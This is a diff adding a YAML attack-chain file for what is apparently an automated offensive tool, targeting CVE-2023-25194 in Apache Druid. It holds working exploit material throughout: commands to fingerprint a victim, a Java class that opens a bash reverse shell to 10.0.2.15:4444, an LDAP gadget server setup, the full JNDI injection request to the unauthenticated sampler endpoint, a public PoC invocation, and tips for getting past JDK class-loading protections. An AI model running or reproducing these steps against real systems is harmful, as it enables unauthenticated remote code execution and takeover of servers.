@@ -1,0 +1,95 @@
+chain_id: druid_cve_2023_25194
+title: "Apache Druid — CVE-2023-25194 unauth JNDI injection via Kafka connector"
+severity: CRITICAL
+tags: [web, druid, apache, cve-2023-25194, jndi, kafka, deserialization, rce]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2023-25194" }
+    - { banner_pattern: "(?i)apache\\s*druid" }
+    - { product_pattern: "(?i)druid" }
+    - { path_pattern: "(?i)/druid/(indexer|coordinator)/v1" }
+
+description: |
+  Apache Druid < 25.0.0 ships the Kafka client with default JNDI
+  lookup enabled. The unauthenticated `POST /druid/indexer/v1/sampler`
+  endpoint deserializes a Kafka client config from JSON, including
+  `sasl.jaas.config` — which Kafka resolves through JNDI. Point JNDI
+  at an attacker-controlled LDAP server hosting a malicious Java
+  class → unauth RCE in the Druid JVM. Same gadget family as
+  Log4Shell, different mount.
+
+steps:
+  - id: 1
+    title: "Fingerprint Druid"
+    command: |
+      curl -sk -I "http://$VICTIMA:8888/" | head
+      curl -sk "http://$VICTIMA:8888/status" | jq .version
+
+  - id: 2
+    title: "Spin up the LDAP gadget server (Marshalsec)"
+    command: |
+      git clone https://github.com/mbechler/marshalsec /tmp/marshalsec
+      cd /tmp/marshalsec && mvn clean package -DskipTests
+      java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar \
+        marshalsec.jndi.LDAPRefServer "http://10.0.2.15:8080/#Exploit" 1389
+      # Compile your gadget (drops a reverse shell):
+      cat > Exploit.java <<'JAVA'
+      public class Exploit {
+        static { try { Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","bash -i >& /dev/tcp/10.0.2.15/4444 0>&1"}); } catch(Exception e){} }
+      }
+      JAVA
+      javac Exploit.java
+      python3 -m http.server 8080 &
+      nc -lvnp 4444
+
+  - id: 3
+    title: "Trigger via the sampler endpoint"
+    command: |
+      curl -sk -X POST "http://$VICTIMA:8888/druid/indexer/v1/sampler?for=connect" \
+        -H 'Content-Type: application/json' \
+        -d @- <<'JSON'
+      {
+        "type": "kafka",
+        "spec": {
+          "type": "kafka",
+          "ioConfig": {
+            "type": "kafka",
+            "consumerProperties": {
+              "bootstrap.servers": "10.0.2.15:1234",
+              "sasl.mechanism": "SCRAM-SHA-256",
+              "security.protocol": "SASL_SSL",
+              "sasl.jaas.config": "com.sun.security.auth.module.JndiLoginModule required user.provider.url=\"ldap://10.0.2.15:1389/Exploit\" useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" group.provider.url=\"xxx\";"
+            },
+            "topic": "rootctl",
+            "useEarliestOffset": true,
+            "inputFormat": {"type": "regex", "pattern": "([\\\\s\\\\S]*)", "listDelimiter": "56616469-6de2-9da4-efb8-847a9c1f7f51", "columns": ["x"]}
+          },
+          "dataSchema": {"dataSource": "rootctl", "timestampSpec": {"column": "!!!_no_such_column_!!!", "missingValue": "1970-01-01T00:00:00Z"}, "dimensionsSpec": {}, "granularitySpec": {"rollup": false}},
+          "tuningConfig": {"type": "kafka"}
+        },
+        "samplerConfig": {"numRows": 500, "timeoutMs": 15000}
+      }
+      JSON
+
+  - id: 4
+    title: "Public PoC + nuclei"
+    command: |
+      git clone https://github.com/jakabakos/CVE-2023-25194-Apache-Druid-RCE /tmp/druid
+      python3 /tmp/druid/exploit.py -t http://$VICTIMA:8888 -lh 10.0.2.15 -lp 4444
+      nuclei -u http://$VICTIMA:8888 -t http/cves/2023/CVE-2023-25194.yaml
+
+common_errors:
+  - error: "Sampler returns 404"
+    solution: |
+      Druid behind a reverse proxy that strips `/druid/`. Try the
+      direct broker port 8082 / coordinator 8081.
+  - error: "JNDI fires but JVM rejects the class load"
+    solution: |
+      JDK 11.0.16+ / 8u121+ blocks remote class loading by default.
+      Use a local-classpath gadget (CommonsCollections / Tomcat WAR)
+      via the same JNDI hook instead of a remote class fetch.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2023-25194
+  - https://druid.apache.org/docs/latest/release-info/security
